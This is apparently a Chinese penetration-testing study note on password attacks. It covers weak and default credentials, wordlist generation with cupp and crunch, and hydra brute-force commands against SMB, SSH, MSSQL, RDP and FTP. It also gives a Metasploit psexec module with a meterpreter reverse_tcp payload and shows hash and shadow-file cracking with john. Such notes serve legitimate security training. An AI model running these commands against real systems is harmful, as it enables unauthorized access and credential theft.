口令安全威胁

* 口令安全概述

很多地方都以用户名(账号)和口令(密码)作为鉴权的方式, 口令(密码)就意味着访问权限

* 口令安全现状

​	@ 弱口令

​	类似于 123456, 654321, admin123等等这样常见的弱密码

​	@ 默认口令

​	很多应用和系统都存在默认口令

​	例如: phpstudy中的mysql [root/root]; tomcat管理控制台默认账号密码[tomcat/tomcat]等等

​	@ 明文传输

​	比如HTTP|FTP|TELNET等服务

​	在网络中传播的数据流都是明文的, 包括口令认证等信息

​	这样的服务, 有被嗅探的风险

* 破解方式

  在线破解方式

  ​	账密, 需要认证

  ​	1.用户名未知, 密码未知

  ​	2.用户名已知, 密码未知

  ​	3.用户名未知, 密码已知

  离线破解方式

  ​	密文还原成明文

* 暴力破解   

  利用所有可能的字符组去尝试破解  最原始的破解方法   根据运算能力 如果能够承受起时间成本的话, 理论上最终一定能爆破出密码

  字符集     密码位数        密码空间

  [0-9]         8  位               10^8=1亿

  \[0-9][a-z] 8  位                36^8

  \[0-9][a-z] 1~8位              ??比较难以承受的空间

  工具 crunch (kali集成)

* 字典破解

  通过合理条件, 筛选或者过滤掉一些全字符组合的内容, 就会大幅度降低爆破的成本

  筛选出的密码组合成特点的字典

  用字典爆破密码可以提高效率, 但是是存在漏掉真实密码的可能性的

  @ 弱口令字典

  如123456, admin等等这样的默认口令或者弱口令组成的字典

  @ 社工字典

  利用人心理和习惯上的漏洞, 比如"名字+生日"

  类似[zhangsan1990]之类的口令很常见

  更具有针对性, 准确率也比较高

  根据个人信息生成密码字典, 可以使用cupp工具

  但是cupp是外国人开发的, 生成逻辑也更靠近国外的个人信息

  常用参数 `-i`  

  ```
  First Name: san
  Surname: zhang
  Nickname: sn0wp3ak
  Birthdate(DDMMYYYY): 12191994
  Partners) name: 
  Partners) nickname:
  Partners) birthday(DDMMYYYY):
  Child's name:
  Child's nickname:
  Child's birthday(DDMMYYYY):
  Pet's name:
  Company name:
  请添加一些关于目标的特殊字符?Y/N: Y
  逗号分隔: 123.com,haha,hello
  添加特殊字符在单词末尾?Y/N
  添加随机数在单词末尾?Y/N
  Leetmode(黑客语)?Y/N
  ```

  国内工具:  真空|亦思

  @ 字符集字典

  如果能确定密码的字符集合, 也可以大大降低爆破的成本

  真空

  kali中的crunch

  crunch创建密码字典的工具, 按照指定规则生成密码字典, 可以灵活的定制自己的字典文件

  使用crunch工具生成的密码可以输出到屏幕, 保存文件或另一个程序

  尤其是在渗透测试需要爆破的时候, 字典的编排等会直接影响我们的爆破速度, 对整个渗透测试流程起着十分重要的作用

  man crunch 

  库文件 /usr/share/crunch/charset.lst

  特殊字符  

  ​	% 代表数字

  ​	^ 代表特殊符号

  ​	@ 代表小写字母

  ​	, 代表大写字母

  生成密码字典

  ​	生成1-8位密码字典, 字符集合为小写字母, 从a到zzzzzzzz结束

  ​	[crunch 1 8]

  ​	生成1-6位密码字典, 字符集合为[abcdefg], 从a到gggggggg结束

  ​	[crunch 1 6 abcdefg]

  ​	生成3位密码字典, 字符集合为[ab ], 从a开始到[  b]结束

  ​	生成指定字符串, 比如生日的日期

  ​	[crunch 8 8 -t 199307%% -e 19930731]

  ​	生成元素的组合, 比如123.com

  ​	[crunch 7 7 -t %%%.com -s 111.com -e 123.com]

  ​	在字典中输出特殊字符 `-l`

  ​	[crunch 3 3 abc -t @@@ -l @aa]

  ​	以元素组合生成字典

  ​	[zhangsan|1993|0701]

  ​	[crunch 4 4 -p zhangsan1993 0701]

  保存字典文件 `-b 指定输出大小`

  ​	[crunch 11 11 -t 1700010%%% -b 20mb -o START]

  自定义字符集合

  ​	将自带字典文件进行备份

  ​	创建自定义字符集合

  ​	使用自定义字符集合生成[*.com]字典文件

  ​		[crunch 5 5 -f charset.lst test -t @.com]

平时积累的字典

​	子域名

​	账号密码

​	常用变量

​	常用文件名

​	文件路径

​		日志文件

​		Web目录

​	弱口令

​	...

Windows口令破解

* windows口令远程爆破

  [hydra -l administrator -P 字典路径 目标IP地址 smb]    445

  九头蛇   在线密码破解工具

  ```
  -l 指定一个用户名
  -p 指定一个密码
  -L 指定用户名字典
  -P 指定密码字典
  -vV 显示爆破细节
  -o 保存爆破结果
  -f 找到真确的密码就结束爆破
  -e
  	n null
  	s same
  	r reverse
  -t 线程 默认16
  ```

  MSF--SMB

  ```
  msfconsole
  use exploit/windows/smb/psexec_psh
  	set payload windows/meterpreter/reverse_tcp
  	show options
  	set RHOSTS 目标IP
  	set SMBUSER 用户名
  	set SMBPASS 密码
  	set LHOSTS 本机IP
  	exploit
  	连接目标计算机
  ```

  

* windows账户hash值破解

  本地破解windows密码

  主要2种方式:

  @ 存内存中读取windows密码

  getpass 直接从内存中读取用户密码

  @ windows hash值破解

  QuarksPwDump读取密码的hash值

  john工具破解

  

Linux口令破解

​	linux口令破解也分为远程破解和本地破解

​	远程主要是爆破ssh服务, 属于在线破解

​	本地需要拿到linux的shadow文件, 进行hash值破解, 属于离线破解

* 破解SSH服务

  我们使用hydra攻击破解ssh服务

  hydra自动集成在kali中

* 本地shadow文件破解

  john工具  也已经集成在kali中了

  需要准备一个字典 [john shadow]

  [john xxx.hash --format=NT --wordlist=/root/dic/pwd.dic]

网络服务网口令破解

​	各种服务的口令破解

* sqlserver

  [hydra -l sa -P /root/dic/test_pwd.dic 目标IP mssql -vV]

* RDP远程桌面服务

  [hydra -l administrator-P /root/dic/test_pwd.dic 目标IP rdp -vV]

* FTP

  [hydra -L /root/dic/test_user.dic -P /root/dic/test_pwd.dic 目标IP ftp -vV]